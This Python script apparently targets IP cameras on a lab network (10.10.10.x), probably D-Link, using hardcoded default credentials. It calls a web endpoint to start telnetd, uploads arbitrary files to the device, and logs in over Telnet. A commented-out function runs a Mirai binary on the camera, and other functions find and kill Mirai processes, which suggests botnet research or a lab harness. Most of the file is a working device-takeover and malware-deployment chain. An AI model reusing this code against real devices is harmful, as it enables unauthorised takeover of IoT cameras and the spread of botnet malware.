import requests
from requests.auth import HTTPBasicAuth
import telnetlib
from time import sleep
import requests
from requests.auth import HTTPBasicAuth
import argparse
import time, re

import subprocess

def kill_process_by_pattern(pattern):
    """Kills processes matching the specified pattern."""
    try:
        # Build the command to find the PIDs of matching processes and kill them
        command = f"ps aux | grep '{pattern}' | awk '{{print $2}}' | xargs kill -9"
        
        # Execute the command
        result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Check if the command executed successfully
        if result.returncode == 0:
            print(f"[+] Processes matching '{pattern}' have been killed successfully.")
        else:
            print(f"[-] Error executing the command: {result.stderr.decode()}")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")

USERNAME = "admin"       # Change to the correct username
PASSWORD = "smcadmin"    # Change to the correct password
KILL_CMD = "kill -9 {}"  # Command to kill process by PID

def connect_telnet(host, username, password):
    """Connects to a remote host over Telnet and logs in."""
    try:
        tn = telnetlib.Telnet(host, timeout=10)
        tn.read_until(b"login: ")
        tn.write(username.encode("utf-8") + b"\n")
        tn.read_until(b"Password: ")
        tn.write(password.encode("utf-8") + b"\n")
        time.sleep(1)  # Wait for login to complete
        return tn
    except Exception as e:
        print(f"Error connecting to {host}: {e}")
        return None

def execute_command(tn, command):
    """Executes a command over Telnet and returns the output."""
    tn.write(command.encode("utf-8") + b"\n")
    time.sleep(5)  # Give time for the command to execute
    output = tn.read_very_eager().decode("utf-8", errors="ignore")
    return output

def find_mirai_pid(output):
    """Parses the Telnet output to find the PID of mirai.mpsl."""
    match = re.search(r"/proc/(\d+)/exe -> /mirai-scan\.mpsl", output)
    if match:
        return match.group(1)
    return None


def kill_mirai_on_bot(host):
    tn = connect_telnet(host, USERNAME, PASSWORD)
    if not tn:
        return

    print("[+] Executing ls command to find mirai process...")
    output = execute_command(tn, "ls -l /proc/*/exe | grep mirai")
    #output = execute_command(tn, "echo Connection Successful")
    #output = execute_command(tn, "ls")
    print("output:", output)

    pid = find_mirai_pid(output)
    if pid:
        print(f"[+] Found mirai process with PID: {pid}")
        print("[+] Killing process...")
        execute_command(tn, KILL_CMD.format(pid))
        print("[+] Process killed successfully.")
    else:
        print("[-] No mirai process found.")

    tn.close()


def enable_telnet(host_last_value):
    # Construct the full IP address from the passed parameter
    url = f"http://10.10.10.{host_last_value}/setSystemCommand"
    username = "admin"
    password = "smcadmin"

    # Form data
    data = {
        "ReplySuccessPage": "home.htm",
        "ReplyErrorPage": "errradv.htm",
        "SystemCommand": "telnetd",
        "ConfigSystemCommand": "test",
    }

    # Send the POST request with Basic Authentication
    response = requests.post(
        url,
        data=data,
        auth=HTTPBasicAuth(username, password)
    )

    # Print the response
    # print("Telnet Enable Status Code:", response.status_code)
    # print("Telnet Enable Response Text:", response.text)
    return response.status_code

def upload_file_to_dlink_cam(host_last_value, file_path):
    # Construct the full IP address for file upload
    url = f"http://10.10.10.{host_last_value}/setFileUpload"
    username = "admin"
    password = "smcadmin"

    # Form data for file upload
    data = {
        "ReplySuccessPage": "replyuf.htm",
        "ReplyErrorPage": "replyuf.htm",
        "FileName": f"/{file_path}",  # Destination path
        "ConfigUploadFile": "Upload File",
    }

    files = {
        "UploadFile": (f"{file_path}", open(file_path, "rb"), "text/plain"),
    }

    # Make the POST request with Basic Authentication to upload the file
    response = requests.post(
        url,
        data=data,
        files=files,
        auth=HTTPBasicAuth(username, password),
    )

    # Print the response
    # print("File Upload Status Code:", response.status_code)
    # print("File Upload Response Text:", response.text)
    return response.status_code

if __name__ == "__main__":

    # Set up argument parser
    parser = argparse.ArgumentParser(description="Enable Telnet on a specific host and optionally upload a file")
    parser.add_argument("host_last_value", type=int, help="The last value of the IP address (e.g., 6 for 10.10.10.6)")

    # Parse the argument
    args = parser.parse_args()

    # Enable Telnet on the specified host
    enable_telnet(args.host_last_value)

    # Ask if the user wants to upload a file
    upload_choice = input("Do you want to upload a file? (yes/no): ").strip().lower()

    if upload_choice == "yes":
        # Ask for the file path
        file_path = input("Enter the file path to upload: ").strip()
        # Upload the file to the same host
        upload_file_to_dlink_cam(host_last_value=args.host_last_value, file_path=file_path)
    else:
        print("File upload skipped.")




# def connect_over_telnet_and_execute_cmd():
#     # Configuration
#     host = "10.10.10.6"  # Replace with the IP address of the target
#     port = 23  # Default Telnet port
#     username = "admin"  # Replace with your username
#     password = "1234"  # Replace with your password
#     command_1 = "cd media/"
#     command = "./mirai"  # Replace with the command you want to execute

#     try:
#         # Connect to the host
#         tn = telnetlib.Telnet(host, port)

#         # Read until login prompt and send the username
#         tn.read_until(b"login: ")
#         tn.write(username.encode('ascii') + b"\n")

#         # Read until password prompt and send the password
#         tn.read_until(b"Password: ")
#         tn.write(password.encode('ascii') + b"\n")

#         # # Wait for the prompt and execute the command
#         tn.read_until(b"# ")  # Adjust if the prompt is different (e.g., #, >)
        
#         tn.write(command_1.encode('ascii') + b"\n")
#         sleep(1)
#         tn.write(command.encode('ascii') + b"\n")

        

#         # Continuously read and print the output
#         while True:
#             output = tn.read_very_eager()
#             if output:
#                 print(output.decode('ascii'), end="")
#     except Exception as e:
#         print(f"Error: {e}")
#     finally:
#         tn.close()

